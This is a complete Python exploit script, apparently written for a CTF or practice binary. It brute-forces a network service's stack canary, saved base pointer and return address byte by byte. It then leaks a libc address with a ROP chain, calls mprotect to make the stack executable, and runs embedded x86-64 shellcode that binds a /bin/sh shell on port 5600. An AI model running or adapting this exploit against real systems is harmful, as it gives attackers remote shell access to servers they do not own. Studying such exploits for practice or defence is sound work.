#!/usr/bin/env python3
# Imports
from threading import Thread, Event, current_thread
from queue import Queue

import argparse
import binascii
import socket
import struct
import time
import sys
import re

 # Find Bytes of Security Cookie, Base Pointer and Return Address
def find_bytes(data_queue, event, ipv4_address, port, interval, data, ret_queue, dbg):
	regex = re.compile("Welcome")
	# Main Thread Loop
	while not data_queue.empty():
		# Continute Looking for Next Byte
		if not event.isSet():
			# Get Next Byte
			byte = data_queue.get()
			data_queue.task_done()
			# Try Socket
			try:
				# Create Socket
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((ipv4_address, port))
				# Get Banner
				msg = s.recv(1024)
				# Menu Selection
				s.send(b"1\n")
				msg = s.recv(1024)
				# Add Byte
				data += struct.pack("<B", byte)
				# Debug
				dprint("[+] {} Trying Byte {}".format(current_thread().name, byte), dbg)
				# Send and Data
				length = len(data)
				length = str(length)
				length += "\n"
				length = str.encode(length)
				s.send(length)
				s.send(data)
				time.sleep(interval)
				# Response
				msg = s.recv(1024)
				# Found Welcome in Response
				if(regex.search(str(msg))):
					ret_queue.put(data)
					# Stop Threads
					event.set()
					# Clean Up
					s.close()
					# Debug
					dprint("[+] {} Exiting Found Byte {}".format(current_thread().name, byte), dbg)
					return True
				else:
					# Remove Last Data Byte
					data = data[:-1]
				# Clean Up
				s.close()
			except:
				# Debug
				print("[-] Error {} Exiting".format(current_thread().name))
				# Stop Threads
				event.set()
				# Exit
				return False
		# Kill Thread
		else:
			# Debug
			dprint("[+] {} Exiting".format(current_thread().name), dbg)
			return False
	# Debug
	dprint("[+] {} Queue Empty Exiting".format(current_thread().name), dbg)
	return False

# Populate Queue
def populate_queue(queue, dbg):
	for byte in range(256):
		queue.put(byte)

# Debug Print
def dprint(msg, dbg):
	if dbg:
		print(msg)

# Pause Program
def wait(enable_wait):
	if enable_wait:
		input("[*] Press Any Key to Continue...")

# Test Connection to Port
def connection_test(ipv4_address, port, dbg):
	# Debug
	dprint("[+] Attempting Connection to {}:{}".format(ipv4_address, port), dbg)
	# Create Socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((ipv4_address, port))
	except:
		return False
	# Clean Up
	s.close()
	return True

# Return Shellcode
def shellcode():
	# Shellcode
	buf = b""
	buf += b"\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29"
	buf += b"\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44"
	buf += b"\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a"
	buf += b"\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05"
	buf += b"\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8"
	buf += b"\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
	buf += b"\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"
	return buf

# Entry Point
def main(event):
	# Parser
	parser = argparse.ArgumentParser(description="Baby Exploit - Full ASLR/DEP/Security Cookie Bypass")
	# Add Arguments
	parser.add_argument("ipv4_address", metavar="IPv4 Address", nargs="?", help="IPv4 Address of Server")
	parser.add_argument("port", metavar="Server Port", nargs="?", type=int, help="Port of Server")
	parser.add_argument("--interval", "-i", nargs="?", type=float, default=0.2, help="Timing Interval")
	parser.add_argument("--thread-count", "-t", nargs="?", type=int, default=5, help="Thread Count to Use")
	parser.add_argument("--enable-wait", "-w", action="store_true", help="Pause Between Operations to Enable Debugging")
	parser.add_argument("--verbosity", "-v", action="store_true", help="Increase Verbosity")
	# Parse
	args = parser.parse_args()
	# Ensure IPv4 and Port
	if not args.ipv4_address or not args.port:
		parser.print_help()
		return 1
	# Assign User Variables
	ipv4_address 	= args.ipv4_address
	port 			= args.port
	interval 		= args.interval
	thread_count	= args.thread_count
	enable_wait		= args.enable_wait
	dbg 			= args.verbosity
	# Debug
	dprint("[+] Verbosity Enabled", dbg)
	dprint("[+] Timing Interval Set to {}".format(interval), dbg)
	# Test Connectivity
	if not connection_test(ipv4_address, port, dbg):
		print("[-] Could not Connect to Remote Server")
		return 1
	# Debug
	print("[*] Using {} Threads".format(thread_count))
	# Buffer
	data = str.encode("A" * 1032)
	# Variables
	security_cookie = b"\x00"
	base_pointer	= b"\x00"
	return_address	= b"\x00"
	# Iterate Security Cookie, Base Pointer, Return Address
	for position in range(24):
		# Clear Event
		event.clear()
		# Processing Queue
		data_queue 	= Queue(maxsize=0)
		ret_queue 	= Queue(maxsize=0)
		# Populate
		populate_queue(data_queue, dbg)
		# Threads
		threads = []
		for thread_num in range(thread_count):
			# Create Thread
			thread = Thread(target=find_bytes, args=(data_queue, event, ipv4_address, port, interval, data, ret_queue, dbg,))
			# Debug
			dprint("[+] Created thread {}".format(thread.name), dbg)
			# Append
			threads.append(thread)
			# Start
			thread.start()
		# Join
		for thread in threads:
			thread.join()
		# Found Byte
		data = ret_queue.get()
		ret_queue.task_done()
		# Print Parameters
		if position <= 7:
			# Get Security Cookie
			security_cookie = data[1032:1040]
		elif position >= 8 and position <= 15:
			# Get Base Pointer
			base_pointer = data[1040:1048]
		else:
			# Get Return Address
			return_address = data[1048:1056]
		# Print
		print("[*] SC: 0x{} BP: 0x{} RA: 0x{}".format(binascii.hexlify(security_cookie).decode("utf-8")[::-1],
											  		  binascii.hexlify(base_pointer).decode("utf-8")[::-1],
											  		  binascii.hexlify(return_address).decode("utf-8")[::-1]), end="\r")
	# Finish
	print()
	print("[*] Found Security Cookie, Base Pointer and Return Address")
	# Decode Parameters
	security_cookie = struct.unpack("<Q", security_cookie)[0]
	base_pointer 	= struct.unpack("<Q", base_pointer)[0]
	return_address 	= struct.unpack("<Q", return_address)[0]
	# Calculae Absolute Addresses
	load_base		= return_address - 0x1954
	send_plt		= load_base + 0xe50
	# Debug
	print("[*] Binary Load Address 0x{}".format(binascii.hexlify(load_base.to_bytes(8, byteorder="big")).decode("utf-8")))
	print("[*] Libc Send GOT Address 0x{}".format(binascii.hexlify(send_plt.to_bytes(8, byteorder="big")).decode("utf-8")))
	# Pause
	wait(enable_wait)
	# Get Libc Base
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ipv4_address, port))
	# Get Banner
	msg = s.recv(1024)
	# Stack Manu Selection
	s.send(b"1\n")
	msg = s.recv(1024)
	# Libc Base Address ROP Chain
	data = str.encode("A" * 1032)
	data += struct.pack("<Q", security_cookie)
	data += struct.pack("<Q", base_pointer)
	data += struct.pack("<Q", load_base + 0x0000000000001c8b) 	# pop rdi; ret;
	data += struct.pack("<Q", 0x4) 								# Value 4 (FD)
	data += struct.pack("<Q", load_base + 0x0000000000001c89) 	# pop rsi; pop r15; ret;
	data += struct.pack("<Q", load_base + 0x202f90) 			# Accept GOT entry
	data += struct.pack("<Q", 0xAAAAAAAAAAAAAAAA) 				# Junk
	data += struct.pack("<Q", load_base + 0x0000000000012a4) 	# Send Length
	# Send Size
	length = len(data)
	length = str(length)
	length += "\n"
	length = str.encode(length)
	# Send Length and Data
	s.send(length)
	s.send(data)
	# Wait
	time.sleep(interval)
	msg = s.recv(1024)
	# Extract Absolute Libc Address
	accept 		= msg[12:18]
	accept 		+= b"\x00\x00"
	accept 		= struct.unpack("<Q", accept)[0]
	libc_base 	= accept - 0xe7e80
	# Debug
	print("[*] Libc Accept Address 0x{}".format(binascii.hexlify(accept.to_bytes(8, byteorder="big")).decode("utf-8")))
	print("[*] Libc Base Address 0x{}".format(binascii.hexlify(libc_base.to_bytes(8, byteorder="big")).decode("utf-8")))
	# Close
	s.close()
	# Pause
	wait(enable_wait)
	# Turn Off NX and Execute Shellcode
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ipv4_address, port))
	# Get Banner
	msg = s.recv(1024)
	# Stack Menu Selection
	s.send(b"1\n")
	msg = s.recv(1024)
	# Libc mprotect ROP Chain
	data = str.encode("A" * 1032)
	data += struct.pack("<Q", security_cookie)
	data += struct.pack("<Q", base_pointer)
	data += struct.pack("<Q", libc_base + 0x00000000000361d8) 	# pop rax; ret;
	data += struct.pack("<Q", 0xA) 								# 10 (mprotect)
	data += struct.pack("<Q", libc_base + 0x0000000000020df2) 	# pop rdi; ret;
	data += struct.pack("<Q", base_pointer & 0xfffffffffffff000) 		# Address
	data += struct.pack("<Q", libc_base + 0x00000000000201e8) 	# pop rsi; ret;
	data += struct.pack("<Q", 0x3E8) 							# 1000 butes
	data += struct.pack("<Q", libc_base + 0x0000000000001b92) 	# pop rdx; ret;
	data += struct.pack("<Q", 0x7) 								# Flags (rwx)
	data += struct.pack("<Q", libc_base + 0x00000000000a7f05) 	# syscall; ret;
	# Calculate Absolute Shellcode Address
	data += struct.pack("<Q", base_pointer + 0x28)	 					# Shellcode address
	# Append Shellcode
	data += shellcode()
	# Send Length
	length = len(data)
	length = str(length)
	length += "\n"
	length = str.encode(length)
	s.send(length)
	time.sleep(interval)
	# Send Exploit
	s.send(data)
	time.sleep(interval)
	msg = s.recv(1024)
	# Clean Up
	s.close()
	# Debug
	print("[*] Listener on port 5600 for address {}".format(ipv4_address))

if __name__ == "__main__":
	# Event
	event = Event()
	# Catch Exit
	try:
		sys.exit(main(event))
	# Catch Exception
	except KeyboardInterrupt:
		# Kill Threads
		print()
		print("Killing Threads")
		event.set()
		# Exit
		print("Exiting")
		sys.exit(0)
